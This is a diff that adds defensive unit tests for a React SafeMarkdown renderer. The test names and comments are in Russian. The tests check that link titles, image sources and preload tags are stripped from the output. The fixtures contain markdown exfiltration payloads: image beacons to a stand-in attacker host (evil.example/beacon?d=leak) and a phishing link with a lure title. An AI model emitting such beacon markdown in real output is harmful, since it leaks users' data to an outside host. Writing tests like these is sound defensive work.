@@ -19,4 +19,50 @@ describe("SafeMarkdown", () => {
     expect(html).not.toContain("href=");
     expect(html).not.toContain("evil.example");
   });
+
+  it("не переносит подсказку ссылки в разметку", () => {
+    const html = renderToStaticMarkup(
+      createElement(
+        SafeMarkdown,
+        null,
+        '[Отчёт](https://evil.example/phish "Перейдите на evil.example")',
+      ),
+    );
+
+    expect(html).toContain("Отчёт");
+    expect(html).not.toContain("title=");
+    expect(html).not.toContain("Перейдите");
+  });
+
+  it("оставляет alt картинки, но не выполняет запрос по её адресу", () => {
+    const html = renderToStaticMarkup(
+      createElement(
+        SafeMarkdown,
+        null,
+        "![Отчёт по списку](https://evil.example/beacon?d=leak)",
+      ),
+    );
+
+    expect(html).toContain("Отчёт по списку");
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("src=");
+    // React добавляет к картинке ещё и `<link rel="preload">`: он тоже уходит
+    // на адрес атакующего, поэтому проверяем отсутствие обоих тегов.
+    expect(html).not.toContain("preload");
+    expect(html).not.toContain("evil.example");
+  });
+
+  it("не возвращает адрес картинки, заданной ссылочным определением", () => {
+    const html = renderToStaticMarkup(
+      createElement(
+        SafeMarkdown,
+        null,
+        "![Отчёт][ref]\n\n[ref]: https://evil.example/beacon?d=leak",
+      ),
+    );
+
+    expect(html).toContain("Отчёт");
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("evil.example");
+  });
 });
